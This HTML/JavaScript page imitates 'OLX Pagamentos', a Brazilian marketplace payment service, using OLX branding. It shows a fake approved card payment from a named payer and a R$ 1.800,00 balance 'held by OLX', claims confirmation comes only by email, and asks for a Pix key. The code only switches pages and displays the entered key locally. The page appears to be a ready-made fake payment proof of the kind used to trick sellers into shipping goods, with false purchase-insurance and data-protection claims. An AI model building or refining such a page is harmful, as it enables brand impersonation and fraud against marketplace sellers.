<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>OLX Pagamentos - Mini App</title>
<style>
  :root{
    --bg:#0f0f10;
    --muted:#bdbdbd;
    --accent:#7a00ff;
    --blue:#2563eb;
    --white:#ffffff;
  }
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--muted);font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;}
  .app{max-width:420px;margin:16px auto;height:calc(100vh - 32px);background:linear-gradient(180deg,#110f12,#0b0b0c);border-radius:14px;overflow:hidden;box-shadow:0 8px 30px rgba(0,0,0,0.6);display:flex;flex-direction:column;}
  header{background:var(--accent);padding:12px 14px;display:flex;align-items:center;gap:12px;color:#fff}
  .logo-img{height:36px;border-radius:6px}
  .title{font-weight:700;font-size:16px;margin-left:6px}
  main{padding:18px;flex:1;overflow:auto}
  .card{padding:6px 0}
  h2{color:var(--white);text-align:center;margin:6px 0 14px 0;font-size:18px;}
  .info{margin:8px 0;line-height:1.5;color:var(--muted);font-size:15px}
  .highlight{color:#e9c1ff;font-weight:700}
  .btn{display:block;width:100%;padding:12px;background:var(--blue);color:#fff;border:0;border-radius:8px;font-weight:700;margin-top:12px;cursor:pointer}
  .btn.secondary{background:#222;border:1px solid #333;color:var(--muted)}
  .input{width:100%;padding:12px;border-radius:8px;border:1px solid #333;background:#0b0b0c;color:var(--white);margin-top:10px}
  .center{text-align:center}
  .small{font-size:13px;color:#9aa0a6}
  .page{display:none}
  .page.active{display:block}
  footer{padding:10px;text-align:center;color:#7f7f7f;font-size:12px}
</style>
</head>
<body>
  <div class="app" role="application" aria-label="OLX Pagamentos mini app">
    <header>
      <!-- Coloque a imagem do logo na mesma pasta com o nome olx_logo.jpeg -->
      <img class="logo-img" src="olx_logo.jpeg" alt="OLX logo">
      <div class="title">OLX Pagamentos</div>
      <div style="margin-left:auto">🔒</div>
    </header>

    <main>
      <!-- Page 1 -->
      <section id="page1" class="page active" aria-live="polite">
        <div class="card">
          <h2>Pagamento</h2>
          <div class="info">N° Cartão: <span class="highlight">5534 **** **** 3020</span></div>
          <div class="info">Validade: <span class="highlight">03/2027</span></div>
          <div class="info">CVV: <span class="highlight">***</span></div>
          <div class="info"><strong>Crédito/Débito:</strong> <span class="highlight">Mastercard</span></div>
          <div class="info"><strong>Transação:</strong><br>Aprovada em <span class="highlight">Mastercard 5534 xxxx xxxx 3020</span></div>

          <!-- Se quiser mostrar o logo do banco Itaú, substitua a imagem abaixo por um arquivo itau_logo.jpeg na mesma pasta -->
          <div class="info center"><img src="olx_logo.jpeg" alt="Itaú / banco" style="height:54px;border-radius:6px"></div>

          <p class="info">O valor já está com a OLX. E será liberado após o comprador(a) qualificar a entrega. Atenção! comprador solicitou seguro compra e você será reembolsado de qualquer dano</p>

          <p class="info"><strong style="color:#98fb98">Por motivo de atualizações:</strong> <strong style="color:#fff">Só estamos confirmando por e-mail.</strong></p>

          <div style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;margin-top:12px;color:var(--muted)">
            <h3 style="color:var(--white);margin:4px 0">Protegemos seus dados.</h3>
            <p class="small">Cumprimos com os mais altos padrões de segurança da indústria.</p>
            <p class="small">Nunca compartilhamos seus dados com ninguém. Apenas enviaremos seu e-mail e telefone ao vendedor para que ele entre em contato depois que você efetuar uma compra, nunca antes!</p>
          </div>

          <div class="info" style="margin-top:12px"><strong>Emissor do pagamento</strong><br>Nome: <span class="highlight">EFERSON VIANA</span></div>
          <div class="info"><strong>Forma de envio:</strong> <span style="display:inline-block;background:#1b1b1b;padding:6px 10px;border-radius:6px;color:var(--muted);font-weight:700">OLX ENTREGAS</span></div>

          <button class="btn" id="btn-view-saldo">Visualizar Saldo</button>
        </div>
      </section>

      <!-- Page 2: Saldo -->
      <section id="page2" class="page" aria-hidden="true">
        <div class="card">
          <h2>Saldo Disponível</h2>
          <p class="center" style="font-size:22px;color:var(--white);font-weight:800">R$ <span id="balance">1.800,00</span></p>
          <p class="small center">O valor estará disponível assim que o comprador qualificar a entrega.</p>
          <button class="btn" id="btn-to-pix">Cadastrar chave Pix</button>
          <button class="btn secondary" id="btn-back-1">⬅️ Voltar</button>
        </div>
      </section>

      <!-- Page 3: Pix -->
      <section id="page3" class="page" aria-hidden="true">
        <div class="card">
          <h2>Transferência via Pix</h2>
          <p class="small">Informe sua chave Pix para cadastrar a transferência:</p>
          <input id="pix-key" class="input" placeholder="Ex: email@provedor.com ou +5511999998888">
          <button class="btn" id="btn-register-pix">Cadastrar</button>
          <button class="btn secondary" id="btn-back-2">Voltar</button>
        </div>
      </section>

      <!-- Page 4: Status -->
      <section id="page4" class="page" aria-hidden="true">
        <div class="card">
          <h2>Status da Transferência</h2>
          <p class="center" style="color:#10b981;font-weight:700">✅ Chave Pix cadastrada com sucesso.</p>
          <p class="center" style="margin-top:8px">⏳ <strong>O valor será liberado assim que o comprador realizar a qualificação.</strong></p>
          <p class="center small">🔒 O pagamento já está protegido com a garantia e seguro da OLX.</p>
          <p id="show-pix" class="center" style="margin-top:12px;color:var(--white);font-weight:700"></p>
          <button class="btn" id="btn-back-3">Voltar ao Saldo</button>
        </div>
      </section>

    </main>

    <footer class="center">Protótipo local — mantenha dados sensíveis protegidos.</footer>
  </div>

<script>
  // Pages list
  const pages = ['page1','page2','page3','page4'];
  function show(id){
    pages.forEach(p=>{
      const el=document.getElementById(p);
      if(!el) return;
      if(p===id){ el.classList.add('active'); el.removeAttribute('aria-hidden'); }
      else { el.classList.remove('active'); el.setAttribute('aria-hidden','true'); }
    });
    window.scrollTo(0,0);
    location.hash = id;
  }

  // Buttons behavior
  document.getElementById('btn-view-saldo').addEventListener('click', ()=> show('page2'));
  document.getElementById('btn-to-pix').addEventListener('click', ()=> { show('page3'); document.getElementById('pix-key').focus(); });
  document.getElementById('btn-back-1').addEventListener('click', ()=> show('page1'));
  document.getElementById('btn-back-2').addEventListener('click', ()=> show('page2'));
  document.getElementById('btn-back-3').addEventListener('click', ()=> show('page2'));

  document.getElementById('btn-register-pix').addEventListener('click', ()=>{
    const v=document.getElementById('pix-key').value.trim();
    if(!v){ alert('Por favor, insira uma chave Pix válida.'); document.getElementById('pix-key').focus(); return; }
    document.getElementById('show-pix').textContent = 'Chave cadastrada: ' + v;
    show('page4');
  });

  // Enter key support
  document.getElementById('pix-key').addEventListener('keydown', (e)=>{ if(e.key==='Enter') document.getElementById('btn-register-pix').click(); });

  // Initialize from hash
  (function(){ const id=(location.hash && location.hash.substring(1))||'page1'; if(pages.includes(id)) show(id); else show('page1'); })();
</script>
</body>
</html>
